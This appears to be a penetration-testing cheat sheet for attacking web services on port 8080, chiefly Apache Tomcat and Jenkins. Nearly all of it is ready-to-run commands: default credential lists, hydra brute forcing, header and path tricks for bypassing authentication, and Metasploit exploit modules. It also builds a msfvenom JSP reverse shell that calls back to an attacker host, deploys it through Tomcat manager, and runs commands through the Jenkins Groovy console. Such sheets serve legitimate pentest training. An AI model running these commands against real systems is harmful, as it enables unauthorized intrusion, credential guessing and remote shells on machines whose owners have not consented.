# HTTP-PROXY ENUMERATION (Port 8080)

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p8080 <IP>                             # Service/Version detection
curl -I http://<IP>:8080                         # HTTP headers
wget --server-response --spider http://<IP>:8080 2>&1 | grep "Server:"
nc -nv <IP> 8080                                 # Manual banner grab
```

## WEB SERVER DETECTION
```bash
# Identify web server/application
whatweb http://<IP>:8080 -a 3                    # Aggressive fingerprinting
nikto -h http://<IP>:8080                        # Vulnerability scanner
nmap -p8080 --script http-headers <IP>           # HTTP headers enumeration
curl -I http://<IP>:8080 | grep -i "server\|x-powered"  # Server info

# Common applications on 8080
# - Apache Tomcat (manager app)
# - Jenkins (CI/CD)
# - JBoss/WildFly
# - WebLogic
# - Proxy servers (Squid, etc.)
# - Development web servers
```

## TOMCAT ENUMERATION (Common on 8080)
```bash
# Tomcat manager discovery
curl http://<IP>:8080/manager/html               # Manager interface
curl http://<IP>:8080/host-manager/html          # Host manager
curl http://<IP>:8080/examples/                  # Example apps

# Tomcat version detection
curl http://<IP>:8080/docs/                      # Documentation (reveals version)
curl http://<IP>:8080/RELEASE-NOTES.txt          # Release notes
nmap -p8080 --script http-title <IP>             # Often shows version in title

# Default Tomcat credentials
tomcat:tomcat
admin:admin
admin:password
tomcat:s3cret
admin:tomcat
root:root
role1:role1
both:both

# Tomcat brute force
hydra -L users.txt -P passwords.txt http-get://<IP>:8080/manager/html
msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS <IP>; set RPORT 8080; run"

# Tomcat exploitation
msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS <IP>; set RPORT 8080; set HttpUsername admin; set HttpPassword admin; run"
```

## JENKINS ENUMERATION
```bash
# Jenkins detection
curl http://<IP>:8080/                           # Jenkins home
curl http://<IP>:8080/login                      # Login page
curl http://<IP>:8080/signup                     # Signup (if enabled)
curl http://<IP>:8080/api/json                   # API endpoint

# Jenkins script console (RCE if accessible)
curl http://<IP>:8080/script                     # Script console
curl http://<IP>:8080/scriptText                 # Script text endpoint

# Jenkins enumeration without auth
curl http://<IP>:8080/asynchPeople/              # Users
curl http://<IP>:8080/view/all/newJob            # Create job

# Jenkins exploitation
# If script console accessible: Groovy RCE
# println "whoami".execute().text
```

## DIRECTORY ENUMERATION
```bash
# Directory brute forcing
gobuster dir -u http://<IP>:8080 -w /usr/share/wordlists/dirb/common.txt -t 50
dirbuster -u http://<IP>:8080 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u http://<IP>:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Common paths to check
/admin
/manager
/console
/dashboard
/api
/swagger
/docs
/examples
/test
/dev
```

## PROXY TESTING (If it's a proxy server)
```bash
# Test if it's an open proxy
curl -x http://<IP>:8080 http://www.google.com   # Use as HTTP proxy
curl --proxy http://<IP>:8080 http://example.com # Alternative syntax

# Check proxy type
nmap -p8080 --script http-open-proxy <IP>        # Detect open proxy

# CONNECT method test (for HTTPS tunneling)
curl -x http://<IP>:8080 https://www.google.com -v

# Proxy authentication test
curl -x http://<IP>:8080 --proxy-user user:pass http://www.google.com
```

## HTTP METHODS TESTING
```bash
# Enumerate allowed methods
nmap -p8080 --script http-methods <IP>
curl -X OPTIONS http://<IP>:8080 -v

# Test dangerous methods
curl -X PUT http://<IP>:8080/test.txt -d "test content"
curl -X DELETE http://<IP>:8080/test.txt
curl -X TRACE http://<IP>:8080                   # XST vulnerability
curl -X TRACK http://<IP>:8080                   # Similar to TRACE
```

## AUTHENTICATION BYPASS
```bash
# Test common bypass techniques
curl http://<IP>:8080/admin -H "X-Forwarded-For: 127.0.0.1"
curl http://<IP>:8080/admin -H "X-Real-IP: 127.0.0.1"
curl http://<IP>:8080/admin -H "X-Originating-IP: 127.0.0.1"
curl http://<IP>:8080/admin -H "Host: localhost"

# Path traversal for auth bypass
curl http://<IP>:8080/admin/..;/
curl http://<IP>:8080/./admin
curl http://<IP>:8080//admin
```

## VULNERABILITY SCANNING
```bash
# Nikto scan
nikto -h http://<IP>:8080                        # Comprehensive scan
nikto -h http://<IP>:8080 -Tuning x              # All tests

# Nmap vuln scripts
nmap -p8080 --script vuln <IP>                   # Vulnerability scan
nmap -p8080 --script http-vuln-* <IP>            # HTTP vulnerabilities

# Searchsploit for common apps
searchsploit tomcat
searchsploit jenkins
searchsploit jboss
```

## DEFAULT CREDENTIALS TESTING
```bash
# Common web application defaults
admin:admin
admin:password
admin:123456
tomcat:tomcat
manager:manager
jenkins:jenkins
root:root
test:test

# Automated testing
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt http-get://<IP>:8080
```

## FILE UPLOAD TESTING
```bash
# If upload functionality exists
curl -X POST -F "file=@shell.jsp" http://<IP>:8080/upload
curl -X POST -F "file=@shell.war" http://<IP>:8080/upload

# Common upload paths
/upload
/uploads
/files
/media
/images
```

## API ENDPOINT DISCOVERY
```bash
# Common API paths
curl http://<IP>:8080/api
curl http://<IP>:8080/api/v1
curl http://<IP>:8080/rest
curl http://<IP>:8080/graphql
curl http://<IP>:8080/swagger.json
curl http://<IP>:8080/api-docs
curl http://<IP>:8080/openapi.json
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/http/tomcat_enum           # Tomcat enumeration
use auxiliary/scanner/http/tomcat_mgr_login      # Tomcat manager brute force
use exploit/multi/http/tomcat_mgr_upload         # Tomcat manager upload
use exploit/multi/http/tomcat_mgr_deploy         # Tomcat manager deploy
use auxiliary/scanner/http/jenkins_enum          # Jenkins enumeration
use exploit/multi/http/jenkins_script_console    # Jenkins RCE
```

## INTERESTING FILES
```bash
# Common interesting files
curl http://<IP>:8080/web.xml
curl http://<IP>:8080/WEB-INF/web.xml            # Java web config
curl http://<IP>:8080/META-INF/MANIFEST.MF
curl http://<IP>:8080/.git/config
curl http://<IP>:8080/.env
curl http://<IP>:8080/config.php
curl http://<IP>:8080/robots.txt
curl http://<IP>:8080/sitemap.xml
```

## WAR FILE DEPLOYMENT (Tomcat)
```bash
# Create malicious WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f war -o shell.war

# Deploy via manager
curl -u admin:admin --upload-file shell.war http://<IP>:8080/manager/text/deploy?path=/shell

# Access shell
curl http://<IP>:8080/shell/

# Alternative: Use Metasploit
msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS <IP>; set RPORT 8080; set HttpUsername admin; set HttpPassword admin; set payload java/meterpreter/reverse_tcp; set LHOST <attacker_IP>; run"
```

## COMMON MISCONFIGURATIONS
```
☐ Default credentials enabled                   # Easy access
☐ Manager/Admin interface exposed               # Attack surface
☐ Directory listing enabled                      # Information disclosure
☐ Verbose error messages                         # Info leakage
☐ Unnecessary services running                   # Attack vectors
☐ Outdated software version                      # Known vulnerabilities
☐ Weak authentication                            # Easy brute force
☐ Missing security headers                       # XSS, clickjacking
☐ Open proxy configuration                       # Abuse potential
☐ PUT/DELETE methods enabled                     # File upload/deletion
```

## QUICK WIN CHECKLIST
```
☐ Check for default credentials (tomcat:tomcat, admin:admin)
☐ Test for Tomcat manager interface
☐ Check for Jenkins installation
☐ Directory enumeration (gobuster/ffuf)
☐ Test for open proxy configuration
☐ Check HTTP methods (PUT, DELETE, TRACE)
☐ Search for API endpoints
☐ Test authentication bypass techniques
☐ Look for file upload functionality
☐ Check for known vulnerabilities (searchsploit)
☐ Test for path traversal
☐ Nikto vulnerability scan
☐ Check robots.txt and sitemap.xml
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive scan
nmap -sV -p8080 --script "http-*" -oA http_8080_enum <IP>

# Quick Tomcat check
curl -u tomcat:tomcat http://<IP>:8080/manager/html

# Fast directory scan
gobuster dir -u http://<IP>:8080 -w /usr/share/wordlists/dirb/common.txt -t 50 -q
```

## POST-EXPLOITATION
```bash
# After gaining access to Tomcat manager
# Deploy web shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f war > shell.war
curl -u admin:admin --upload-file shell.war http://<IP>:8080/manager/text/deploy?path=/pwn

# After gaining access to Jenkins
# Execute commands via script console (Groovy)
println "whoami".execute().text
println "cmd /c whoami".execute().text           # Windows
```
